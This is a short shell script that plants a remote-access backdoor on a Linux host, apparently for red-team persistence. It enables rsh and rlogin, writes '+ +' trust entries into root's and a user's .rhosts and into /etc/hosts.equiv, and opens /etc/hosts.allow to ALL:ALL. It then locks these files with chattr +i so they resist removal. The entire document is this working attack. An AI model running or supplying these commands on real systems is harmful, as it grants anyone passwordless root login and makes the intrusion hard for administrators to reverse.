sudo chattr +i /etc/securetty
sudo chattr -i /etc/xinetd.d/rsh
sudo chattr -i /etc/xinetd.d/rlogin
sudo chattr -i /home/Dave/.rhosts
sudo chattr -i /root/.rhosts
sudo touch /etc/xinetd.d/rsh
sudo touch /etc/xinetd.d/rlogin
sudo cat rshFile >| /etc/xinetd.d/rsh
sudo cat rlogin >| /etc/xinetd.d/rlogin
sudo service xinetd restart
sudo touch /home/Dave/.rhosts
sudo echo "+ +" >| /home/Dave/.rhosts
sudo touch /root/.rhosts
sudo echo "+ +" >| /root/.rhosts 
sudo chmod 600 /etc/xinetd.d/rsh
sudo chmod 600 /etc/xinetd.d/rlogin
sudo chmod 600 /home/Dave/.rhosts
sudo chmod 600 /root/.rhosts
sudo chattr +i /etc/xinetd.d/rsh
sudo chattr +i /etc/xinetd.d/rlogin
sudo chattr +i /home/Dave/.rhosts
sudo chattr +i /root/.rhosts
sudo chattr -i /etc/hosts.allow
sudo echo "ALL:ALL" >| /etc/hosts.allow
sudo chattr +i /etc/hosts.allow
sudo chattr -i /etc/hosts.equiv
sudo echo "+ +" >| /etc/hosts.equiv
sudo chattr +i /etc/hosts.equiv
